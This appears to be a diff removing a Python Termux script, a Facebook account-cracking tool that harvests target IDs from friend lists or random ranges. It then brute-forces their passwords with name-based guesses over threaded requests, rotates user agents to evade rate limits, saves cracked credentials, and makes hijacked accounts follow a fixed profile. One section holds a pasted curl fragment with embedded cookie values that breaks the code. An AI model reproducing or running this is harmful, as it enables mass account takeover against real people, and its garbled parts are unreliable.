-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
-
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
-
-tgl = datetime.datetime.now().day
-
-bln = dic[(str(datetime.datetime.now().month))]
-
-thn = datetime.datetime.now().year
-
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-
-# CLEAR
-
-def clear():
-
-	os.system("clear")
-
-# BACK
-
-def back():
-
-	login()
-
- 
-
-Mrdevil="-SKD"
-
-imt="-brand=="
-
-ak="-pro"
-
-myid=uuid.uuid4().hex[:10].upper()
-
-try:
-
-	key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
-
-except:
-
-	kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w')
-
-	kok.write(myid+imt)
-
-	kok.close()
-
-def login():
-
-	try:
-
-		token = open('.token.txt','r').read()
-
-		tokenku.append(token)
-
-		try:
-
-			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
-
-			public_menu()
-
-		except KeyError:
-
-			Public()
-
-		except requests.exceptions.ConnectionError:
-
-			clear()
-
-			print(logo)
-
-			print ( ' [×] Connection Timeout')
-
-			exit()
-
-	except IOError:
-
-		Public()
-
+### Display Text
 def jalan(z):
-
-	for e in z + '\n':
-
-		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-
-############### #LOGO############## ## 
-
- 
-
-# LOGIN
-
-def Public():
-
-	clear()
-
-	print(logo)
-
-	print  (' [01] Login With Token\n [02] Login With Cookie')
-
-	pil=input('\n [#] Select One : ')
-
-	if pil in ['1','01']:
-
-		panda = input(' [+] Token : ')
-
-		akun=open('.token.txt','w').write(panda)
-
-		try:
-
-			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
-
-			tes3 = json.loads(tes.text)['id']
-
-			print (" [] Login Successful")
-
-			login()
-
-		except KeyError:
-
-			print( ' [×] Login Failed ')
-
-			time.sleep(2.5)
-
-			Public()
-
-		except requests.exceptions.ConnectionError:
-
-			print ( ' [×] Connection Timeout')
-
-			exit()
-
-	elif pil in ['2','02']:
-
-		try:
-
-			cookie=input(" [+] Cookie : ")
-
-			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
-
-			find_token = re.search("(EAAG\w+)", data.text)
-
-			ken=open(".token.txt", "w").write(find_token.group(1))
-
-			print (" [] Login Successful")
-
-			login()
-
-		except Exception as e: 
-
-			os.system("rm -f .token.txt")
-
-			print( ' [×] Login Failed ')
-
-			time.sleep(2.5)
-
-			login()
-
-			exit()
-
-def public_menu():
-
-	try:
-
-		token = open('.token.txt','r').read()
-
-	except IOError:
-
-		exit()
-
-	clear()
-
-	print(logo)
-
-	pil = input('\n [+] Enter ID Target : ')
-
-	try:
-
-		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
-
-		for pi in koh2['friends']['data']:
-
-			id.append(pi['id']+'|'+pi['name'])
-
-		print(' [] Total : '+str(len(id)))
-
-		setting()
-
-	except requests.exceptions.ConnectionError:
-
-		print (' [#] Connection Time Out')
-
-		exit()
-
-	except (KeyError,IOError):
-
-		print(' [!] Not public Or Token Expire')
-
-		exit()
-
-def File():
-
-			clear()
-
-			print(logo)
-
-			try:
-
-				fileX = input ('\n [+] Enter file path : ') 
-
-				for line in open(fileX, 'r').readlines():
-
-					id.append(line.strip())
-
-				setting()
-
-			except IOError:
-
-				exit("\n [!] file %s not found"%(fileX))
-
- 
-
-def setting():
-
-	hu = ("2")
-
-	if hu in ['1','01']:
-
-		for tua in sorted(id):
-
-			id2.append(tua)
-
- 
-
-	elif hu in ['2','02']:
-
-		muda=[]
-
-		for bacot in sorted(id):
-
-			muda.append(bacot)
-
-		bcm=len(muda)
-
-		bcmi=(bcm-1)
-
-		for xmud in range(bcm):
-
-			id2.append(muda[bcmi])
-
-			bcmi -=1
-
-	elif hu in ['3','03']:
-
-		for bacot in id:
-
-			xx = random.randint(0,len(id2))
-
-			id2.insert(xx,bacot)
-
-	else:
-
-		print (' [!] Choose Correct Option')
-
-		exit()
-
-	clear()
-
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
-
-	hc = input ("\n [#] method : ")
-
-	if hc in ['1','01']:
-
-		method.append('mobile')
-
-	elif hc in ['2','02']:
-
-		method.append('free')
-
-	else:
-
-		method.append('mobile')
-
-	passmenu()
-
-def passmenu():
-
-	clear()
-
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
-
-	passmen=input('\n [#] Select Pass : ')
-
-	if passmen in ['1','01']:
-
-		first()
-
-	elif passmen in ['2','02']:
-
-		name()
-
-	elif passmen in ['3','03']:
-
-		name2()
-
-	else:
-
-		passmenu()
-
-		
-
-def first():
-
-	clear()
-
-	print(logo);print( '\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
-
-	with tred(max_workers=30) as pool:
-
-		for yuzong in id2:
-
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-
-			frs = nmf.split(' ')[0]
-
-			pwv = ['445566']
-
-			if len(nmf)<6:
-
-				if len(frs)<3:
-
-					pass
-
-				else:
-
-					pwv.append(frs+'123')
-
-					pwv.append(frs+'12345')
-
-			else:
-
-				if len(frs)<3:
-
-					pwv.append(nmf)
-
-				else:
-
-					pwv.append(nmf)
-
-					pwv.append(frs+'123')
-
-					pwv.append(frs+'12345')
-
-			if 'mobile' in method:
-
-				pool.submit(crack,idf,pwv)
-
-			elif 'free' in method:
-
-				pool.submit(free,idf,pwv)
-
-			else:
-
-				pool.submit(crack,idf,pwv)
-
-def name():
-
-	clear()
-
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
-
-	with tred(max_workers=30) as pool:
-
-		for yuzong in id2:
-
-			try:
-
-				idf,nmf = yuzong.split('|')
-
-				xz = nmf.split(' ')
-
-				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
-
-				else:
-
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
-
-				if 'mobile' in method:
-
-					pool.submit(crack,idf,pwv)
-
-				elif 'free' in method:
-
-					pool.submit(free,idf,pwv)
-
-				else:
-
-					pool.submit(crack,idf,pwv)
-
-			except:
-
-				pass
-
-def name2():
-
-	clear()
-
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
-
-	with tred(max_workers=30) as pool:
-
-		for yuzong in id2:
-
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-
-			frs = nmf.split(' ')[0]
-
-			pwv = ['445566']
-
-			if len(nmf)<6:
-
-				if len(frs)<3:
-
-					pass
-
-				else:
-
-					pwv.append(frs+'123')
-
-					pwv.append(frs+'12345')
-
-			else:
-
-				if len(frs)<3:
-
-					pwv.append(nmf)
-
-				else:
-
-					pwv.append(nmf)
-
-					pwv.append(frs+'123')
-
-					pwv.append(frs+'12345')
-
-					pwv.append(frs+'1234')
-
-					pwv.append(frs+'786')
-
-			if 'mobile' in method:
-
-				pool.submit(crack,idf,pwv)
-
-			elif 'free' in method:
-
-				pool.submit(free,idf,pwv)
-
-			else:
-
-				pool.submit(crack,idf,pwv)
-
-	
-
-# CRACKER
-
-def crack(idf,pwv):
-
-	global loop,ok,cp
-
-	bi = random.choice([u,k,kk,b,h,hh])
-
-	pers = loop*100/len(id2)
-
-	fff = '%'
-
-	sys.stdout.write('\r %s[ Proces start] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
-
-	sys.stdout.flush()
-
-	ua = random.choice(ugen)
-
-	ua2 = random.choice(ugen2)
-
-	ses = requests.Session()
-
-	for pw in pwv:
-
-		try:
-
-			pw = pw.lower()
-
-			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
-
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
-
-			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
-
-			if "checkpoint" in po.cookies.get_dict().keys():
-
-				cp +=1
-
-				print( f'\r\x1b[1;91m [彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -CP ] {idf} | {pw}')
-
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-
-				akun.append(idf+'|'+pw)
-
-				break
-
-			elif "c_user" in ses.cookies.get_dict().keys():
-
-				coki=po.cookies.get_dict()
-
-				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-
-				print(f'\r\x1b[1;92m [彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK ] {idf} | {pw}')
-
-				wrt =('%s - %s' % (idf,pw))
-
-				ok.append(wrt)
-
-				open('/sdcard/彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK.txt','a').write('%s\n' % wrt)
-
-				follow(ses,coki)
-
-				break
-
- 
-
-			else:
-
-				continue
-
-		except requests.exceptions.ConnectionError:
-
-			time.sleep(31)
-
-	loop+=1
-
-def free(idf,pwv):
-
-	global loop,ok,cp
-
-	bi = random.choice([u,k,kk,b,h,hh])
-
-	pers = loop*100/len(id2)
-
-	fff = '%'
-
-	sys.stdout.write('\r %s[ Proces start] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
-
-	sys.stdout.flush()
-
-	ua = random.choice(ugen)
-
-	ua2 = random.choice(ugen2)
-
-	ses = requests.Session()
-
-	for pw in pwv:
-
-		try:
-
-			pw = pw.lower()
-
-			ses.headers.update({"Host":'https://https://free.facebook.com/' \
-  -H 'authority: free.facebook.com' \
-  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
-  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
-  -H 'cache-control: max-age=0' \
-  -H 'cookie: datr=2KcuZDv4aTL5Zq4-UaRwtBTq; sb=2KcuZEWQh7e2HC3NDO_3ZRsI; locale=en_GB; vpd=1405x720x1.3562500476837158; zsh=ASQVFeGNZolqA7fpODHimfs-n12XMcVKGxiN-1xtplzDx4XXuAsr-m8_C_5vryEAM3YPGeQZ6zZj1xjrGhsM1j0KtpdIL0_j9pOj_zMtoPU5DYCwCXA4u2tlCp87aWxzFG3Vex-pgUBIyawjt-2bqs5voI-QOP8FjM_Iy4AmFnfylBOvTdtoyaW5Yw0R0_Uw9UtN2E0pB5bItAR1-Opd-6ylRPQ6xvl8IzEKQXdQdcY6eHJ7upej1sM0BMcGlGAdu4SMoYvcRo6FWeaQzqmCJRRShcvzWmlNhtEczY1Pn0p3I9hBNxRLyX1oFRSdtGWQUQ; m_pixel_ratio=1.3562500476837158; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZZWHZ2VmltSmgxTDE2bXhseC02a2RRTC01MDhKQmJtUVBuUVBoNGIzcV9UcUZGQ0xQdVp6ZkdrZjF0X19WVk1JRSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZllYdnZWaW1KaDFMMTZteGx4LTZrZFFMLTUwOEpCYm1RUG5RUGg0YjNxX1RxRkZDTFB1WnpmR2tmMXRfX1ZWTUlFIiwicyI6Im1vYmlsZSJ9; wd=532x1037; oo=v1; fr=00iIqkBl3AyeOyZfy..BkNGdg.BJ.AAA.0.0.BkNGfq.AWVvXLpf3qc' \
-  -H 'sec-ch-ua: "(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"' \
-  -H 'sec-ch-ua-mobile: ?0' \
-  -H 'sec-ch-ua-model: "dandelion"' \
-  -H 'sec-ch-ua-platform: "macOS"' \
-  -H 'sec-fetch-dest: document' \
-  -H 'sec-fetch-mode: navigate' \
-  -H 'sec-fetch-site: none' \
-  -H 'sec-fetch-user: ?1' \
-  -H 'upgrade-insecure-requests: 1' \
-  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5664.223 Safari/537.36' \
-  --compressed)
-
-			if "checkpoint" in po.cookies.get_dict().keys():
-
-				rint( f'\r\x1b[1;92m [彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -Ok] {idf} | {pw}')
-
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-
-				akun.append(idf+'|'+pw)
-
-				break
-
-			elif "c_user" in ses.cookies.get_dict().keys():
-
-				coki=po.cookies.get_dict()
-
-				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-
-				print(f'\r\x1b[1;92m [彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK] {idf} | {pw}')
-
-				wrt =('%s - %s' % (idf,pw))
-
-				ok.append(wrt)
-
-				open('/sdcard/彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK.txt','a').write('%s\n' % wrt)
-
-				follow(ses,coki)
-
-				break
-
-
-
-			else:
-
-				continue
-
-		except requests.exceptions.ConnectionError:
-
-			time.sleep(31)
-
-	loop+=1
-
-def follow(ses,coki):
-
-	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
-
-	get = r.find('a', string='Follow').get('href')
-
-	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-
-os.system("clear")
-
-logo = """
-\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█
-
-\033[1;33m █████╗ ██████╗ ███████╗███████╗██╗     
-\033[1;33m██╔══██╗██╔══██╗██╔════╝██╔════╝██║     
-\033[1;33m███████║██║  ██║█████╗  █████╗  ██║     
-\033[1;33m██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║     
-\033[1;33m██║  ██║██████╔╝███████╗███████╗███████╗
-\033[1;33m╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝
-                                        
-                                        
-\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█
- 
-
-        \x1b[97m[\033[37;41m  FEEL THE POWER OF 彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 \033[0;m]
-
-
-\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█
-                                                
-
-\033[1;32m𓆩𝗔𝗨𝗧𝗛𝗢𝗥‣᭄𓆪 : 彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡
-
-\033[1;33m𓆩𝗢𝗪𝗡𝗘𝗥‣᭄𓆪  : ༆𝗔𝗗𝗘𝗘𝗟☆𝗟𝗘𝗚𝗛𝗔𝗥𝗜ღღ༆
-
-\033[1;36m𓆩𝗧𝗘𝗔𝗠‣᭄𓆪   :\x1b[97m[\033[37;41m𝗙𝗬𝗧𝗥 ,  𝗥𝗘𝗣𝗢𝗧𝗘𝗥, 𝗖𝗟𝗢𝗡𝗘𝗥 ,ღ 𝗔𝗗𝗘𝗘𝗟✯𝗛𝗘𝗥𝗘★\033[0;m]
-
-\033[1;32m𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝗔𝗗𝗘𝗘𝗟 𝗧𝗢𝗢𝗟
-
-\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█"""
-os.system("xdg-open https://www.facebook.com/ved.baghel.39")
-class Main:
-
-	def __init__(self):
-
-		self.id = []
-
-		self.ok = []
-
-		self.cp = []
-
-		self.loop = 0
-       
-		print (logo)
-        
-
-		print(" \033[1;39m━▷Choose method")
-
-
-		print("\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█")
-        
-		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
-		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
-		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mOld Cloning Id's 2011-16\033[0;92m  ✓ (Best) ")
-		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
-        
-        
-		Mrdevil =input(" \033[0;93mChoose : ")
-
-		if Mrdevil in ["1", "01"]:
-
-			File()
-
-		if Mrdevil in ["2", "02"]:
-
-			Public()
-
-		if Mrdevil in ["3", "03"]:
-
-			os.system("python2 jutt-brand.py")
-
-		if Mrdevil in ["4", "04"]:
-
-			self.old()
-
-		if Mrdevil in ["5", "05"]:
-
-			self.old2()
-
-			exit()
-
-		else:
-
-			print (" \033[1;37mSelect Correctly ")
-
-			time.sleep(1)
-
-			Main()
-
- 
-
-	def old(self):
-
-		x = 111111111
-
-		xx = 999999999
-
-		idx = "100000" 
-
-		os.system('clear');print(logo)
-
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 90,000: "))
-
-		try:
-
-			for n in range(limit):
-
-				_ = random.randint(x,xx)
-
-				__ = idx
-
-				self.id.append(__+str(_))
-
-			
-
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-
-			with ThreadPoolExecutor(max_workers=30) as coeg:
-
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
-
-				listpass = input("%s [?] TYPE THE PASSWORD :%s "%(G,Y))
-
-				if len(listpass)<=5:
-
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
-
-				os.system("clear")
-
-				print(logo)
-
-				print("     \x1b[97m[\033[37;41m   𝗧𝗛𝗘 𝗔𝗗𝗘𝗘𝗟 𝗧𝗢𝗢𝗟\033[0;m")
-
-				print("\n\033[1;39m [+] BRUTE HAS BEEN START")
-
-				print(" \033[1;32m[+] Note: Cp Account Open After 24 Hours")
-
-				print("\033[1;34m [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
-
-				print("\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█")
-
-				print("\n")
-
-				print("\033[0;97m")
-
-				for user in self.id:
-
-					coeg.submit(self.api, user, listpass.split(","))
-
-			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using My Tool...")
-
-		except Exception as e:exit(str(e))
-
-
-	def api(self, uid, pwx):
-
-		rua = random.choice([
-
-		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-
-			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
-
-  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
-
-  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
-
-  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
-
-  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
-
-  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
